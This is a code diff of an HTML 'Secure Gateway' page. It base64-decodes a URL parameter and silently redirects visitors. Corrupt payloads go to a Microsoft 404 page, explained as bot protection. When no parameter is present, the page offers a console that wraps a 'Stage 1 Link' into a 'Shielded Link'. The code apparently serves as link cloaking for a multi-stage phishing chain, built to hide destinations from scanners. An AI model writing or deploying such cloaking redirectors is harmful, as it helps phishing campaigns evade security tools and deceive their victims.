@@ -2,42 +2,46 @@
 <html>
 <head>
     <title>Secure Gateway</title>
+    <style id="antiFlash">body { display: none !important; }</style>
     <script>
-        // --- THE BOUNCER LOGIC ---
-        window.onload = function() {
+        // RUN IMMEDIATELY (Before page renders)
+        (function() {
             const urlParams = new URLSearchParams(window.location.search);
             const payload = urlParams.get('p');
             
             if (payload) {
                 try {
-                    // 1. Decode the destination
                     const destination = atob(payload);
-                    
-                    // 2. Immediate Redirect for Humans
+                    // Trigger jump immediately
                     window.location.replace(destination);
                 } catch (e) {
-                    // 3. Fallback to Microsoft 404 if payload is corrupt (Bot Protection)
+                    // Fallback for bots/errors
                     window.location.replace("https://learn.microsoft.com/en-us/errors/404");
                 }
+            } else {
+                // No payload? Show the generator UI
+                document.addEventListener("DOMContentLoaded", function() {
+                    document.getElementById("antiFlash").remove();
+                });
             }
-        };
+        })();
     </script>
     <style>
-        /* Simple styling for the Generator UI (only visible when no ?p= is used) */
-        body { font-family: sans-serif; background: #0f172a; color: white; padding: 40px; text-align: center; }
-        .box { max-width: 500px; margin: auto; background: #1e293b; padding: 20px; border-radius: 10px; }
-        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
-        button { background: #3b82f6; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+        body { font-family: sans-serif; background: #0f172a; color: white; padding: 40px; text-align: center; display: block; }
+        .box { max-width: 500px; margin: auto; background: #1e293b; padding: 20px; border-radius: 10px; border: 1px solid #334155; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: white; }
+        button { background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        #result { word-break: break-all; color: #10b981; margin-top: 20px; font-family: monospace; font-size: 13px; }
     </style>
 </head>
 <body>
     <div class="box">
         <h2>Gateway Console</h2>
-        <p>Enter Stage 1 Link:</p>
+        <p>Paste Stage 1 Link:</p>
         <input type="text" id="target" placeholder="https://your-worker.dev/#key">
         <br>
         <button onclick="generate()">Generate Shielded Link</button>
-        <p id="result" style="word-break: break-all; color: #10b981; margin-top: 20px;"></p>
+        <div id="result"></div>
     </div>
 
     <script>
